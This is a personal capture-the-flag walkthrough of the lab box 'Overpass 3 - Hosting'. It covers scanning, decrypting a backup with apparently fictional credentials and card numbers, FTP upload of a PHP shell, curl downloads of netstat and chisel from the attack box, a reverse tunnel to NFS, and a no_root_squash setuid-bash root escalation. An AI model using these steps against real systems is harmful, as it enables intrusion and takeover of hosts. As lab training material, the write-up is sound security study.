@@ -1,0 +1,242 @@
+
+Name: Overpass 3 - Hosting
+Date: 03/01/2022
+Difficulty: Medium
+Description: You know them, you love them, your favourite group of broke computer science students have another business venture! Show them that they probably should hire someone for security...
+Better Description: I liked the description this room that had port forwarding/tunnel felt like a massive milestone. So thanks.
+Goals: Practice som elinux networking 
+Learnt: Chisel and tunneling, using some of the builtin networking commands, although in hindsight moving to using ss more instead of netstat.
+
+
+Overpass3 - Adventures in Hosting
+
+Intro:
+
+After Overpass's rocky start in infosec, and the commercial failure of their password manager and subsequent hack, they've decided to try a new business venture.
+
+Overpass has become a web hosting company!
+Unfortunately, they haven't learned from their past mistakes. Rumour has it, their main web server is extremely vulnerable.
+
+Warning: This box can take around 5 minutes to boot if you're not a subscriber. As a subscriber, it will be ready much faster.
+
+I will review writeups for this room starting from 1 week after release. Before then, please do not publish writeups. Keeping them unlisted is fine but please do not share them.
+
+You're welcome to stream this room once writeups are approved.
+
+root@ip-10-10-210-148:~# nmap -sV -sC -O -T 4 -p- 10.10.174.142
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-02 16:11 GMT
+Nmap scan report for ip-10-10-174-142.eu-west-1.compute.internal (10.10.174.142)
+Host is up (0.00080s latency).
+Not shown: 65532 filtered ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
+|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
+|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (EdDSA)
+80/tcp open  http    Apache httpd 2.4.37 ((centos))
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.37 (centos)
+|_http-title: Overpass Hosting
+MAC Address: 02:FD:C1:4B:45:47 (Unknown)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.13 (93%), Linux 3.8 (93%), Crestron XPanel control system (89%), HP P2000 G3 NAS device (86%), ASUS RT-N56U WAP (Linux 3.4) (86%), Linux 3.1 (86%), Linux 3.16 (86%), Linux 3.2 (86%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (86%), Linux 2.6.32 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OS: Unix
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 262.30 seconds
+
+Can't Anonymous login via ftp, nikto and gobuster outputs below:
+
+
+root@ip-10-10-210-148:~# nikto -h 10.10.174.142
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.10.174.142
++ Target Hostname:    ip-10-10-174-142.eu-west-1.compute.internal
++ Target Port:        80
++ Start Time:         2022-01-02 16:15:59 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.37 (centos)
++ Server leaks inodes via ETags, header found with file /, fields: 0x6ea 0x5b4538a1d1400 
++ The anti-clickjacking X-Frame-Options header is not present.
++ Retrieved x-powered-by header: PHP/7.2.24
++ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE 
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
++ End Time:           2022-01-02 16:16:18 (GMT0) (19 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+root@ip-10-10-210-148:~# gobuster dir -u http://10.10.174.142 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.174.142
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2022/01/02 16:16:02 Starting gobuster
+===============================================================
+/backups (Status: 301)
+===============================================================
+2022/01/02 16:16:31 Finished
+===============================================================
+
+Download the backup.zip
+
+unzip backup.zip
+gpg --import priv.key
+gpg CustomerDetails.xlsx.gpg
+
+XLS file
+A file with the XLSX file extension is a Microsoft Excel Open XML Format Spreadsheet file
+
+containing:
+
+Customer Name           Username        Password                Credit card number      CVC
+Par.    A. Doxx         paradox         ShibesAreGreat123       4111 1111 4555 1142     432
+0day    Montgomery      0day            OllieIsTheBestDog       5555 3412 4444 1115     642
+Muir    Land            muirlandoracle  A11D0gsAreAw3s0me       5103 2219 1119 9245     737
+
+
+ftp as paradox with password
+put shell.php
+/shell.php
+shell stabalise with
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+TERM=xterm
+ctrl+z
+stty raw -echo; fg
+
+su as paradox same password as ftp
+[paradox@ip-10-10-174-142 ~]$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+as we have a password but:
+Sorry, user paradox may not run sudo on ip-10-10-174-142.
+wget not installed so no enumeration scripts, go pure manual!
+read a write up while I was waiting for my mounting approach to work. I have forgotten the power of curl.
+I might just make I ctf entirely around curl.
+
+[paradox@ip-10-10-174-142 /]$ cat /etc/exports
+/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
+
+It blocked it:
+root@ip-10-10-210-148:~/op3# showmount -e 10.10.174.142
+clnt_create: RPC: Port mapper failure - Unable to receive: errno 113 (No route to host)
+
+Read more of the 0xsans write up:
+use curl! get a netstat bin from attack box at /bin
+
+paradox@ip-10-10-174-142 tmp]$ ls
+<mp]$ curl http://10.10.210.148:4444/netstat > netstat                       
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  150k  100  150k    0     0  73.5M      0 --:--:-- --:--:-- --:--:-- 73.5M
+[paradox@ip-10-10-174-142 tmp]$ ls
+netstat
+[paradox@ip-10-10-174-142 tmp]$ chmod +x netstat 
+[paradox@ip-10-10-174-142 tmp]$ ./netstat -tulnp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:35055           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:20048           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:47239           0.0.0.0:*               LISTEN      -      ## IT IS blocked!!!             
+tcp6       0      0 :::41997                :::*                    LISTEN      -                   
+tcp6       0      0 :::111                  :::*                    LISTEN      -                   
+tcp6       0      0 :::20048                :::*                    LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::21                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::49373                :::*                    LISTEN      -                   
+tcp6       0      0 :::2049                 :::*                    LISTEN      -                   
+udp        0      0 127.0.0.1:323           0.0.0.0:*                           -                   
+udp        0      0 127.0.0.1:946           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:38845           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:46050           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:20048           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:111             0.0.0.0:*                           -                   
+udp6       0      0 :::57100                :::*                                -                   
+udp6       0      0 ::1:323                 :::*                                -                   
+udp6       0      0 :::46140                :::*                                -                   
+udp6       0      0 :::20048                :::*                                -                   
+udp6       0      0 :::111                  :::*                                - 
+
+
+Continued to read to find that I need to do tunneling NOT ever done any tunneling:
+download https://github.com/jpillora/chisel
+curl http://attackbox:port/chisel.gz 
+gzip chisel.gz -f -d
+
+[paradox@ip-10-10-174-142 tmp]$ ls -la
+total 8296
+drwxrwxrwt   2 root    root         35 Jan  2 18:26 .
+drwxr-xr-x. 17 root    root        244 Nov 18  2020 ..
+-rw-rw-r--   1 paradox paradox 8339456 Jan  2 18:25 chisel
+-rwxrwxr-x   1 paradox paradox  154192 Jan  2 17:45 netstat
+[paradox@ip-10-10-174-142 tmp]$ chmod +x chisel 
+<mp]$ ./chisel client 10.10.210.148:8080 R:2049:127.0.0.1:2049               
+2022/01/02 18:28:06 client: Connecting to ws://10.10.210.148:8080
+2022/01/02 18:28:06 client: Connected (Latency 829.545µs)
+
+root@ip-10-10-210-148:~# chisel server -p 8080 --reverse -v 
+2022/01/02 18:27:32 server: Reverse tunnelling enabled
+2022/01/02 18:27:32 server: Fingerprint VkWA9daIwT0Pte1aWTcIoM4U8pABlmzFNwrCb2DzxJ0=
+2022/01/02 18:27:32 server: Listening on http://0.0.0.0:8080
+2022/01/02 18:28:06 server: session#1: Handshaking with 10.10.174.142:40612...
+2022/01/02 18:28:06 server: session#1: Verifying configuration
+2022/01/02 18:28:06 server: session#1: tun: Created
+2022/01/02 18:28:06 server: session#1: tun: proxy#R:2049=>2049: Listening
+2022/01/02 18:28:06 server: session#1: tun: Bound proxies
+2022/01/02 18:28:06 server: session#1: tun: SSH connected
+
+I had many issues with this last part. Mainly that when sshing in I was asked for a password.
+Then file transfering a bash binary that was compatible with extra shell. Then the next day the ssh worked,
+I did the same as before maybe someone had added a password as I am sure I tried from the .ssh directory in /home/james.
+Then I did the cp as james and the chown and chmod stuff from the mount and boom!
+
+mount -vvvv -t nfs4 127.0.0.1:/ /mnt
+
+GET james's id_rsa!
+ssh as james with id_rsa 
+ssh -i id_rsa -l james @ip
+
+as james:
+cp /bin/bash /home/james/bash
+
+As attackbox
+cd /mnt
+chown root:0 bash
+chmod +s /mnt/bash
+
+as James
+./bash -p # p for priveleged!
+and you are now a using a root own bash shell and can read and do whatever!
+
+
+cat /usr/share/httpd/web.flag
+cat /home/james/user.txt
+cat /root/root.txt
+
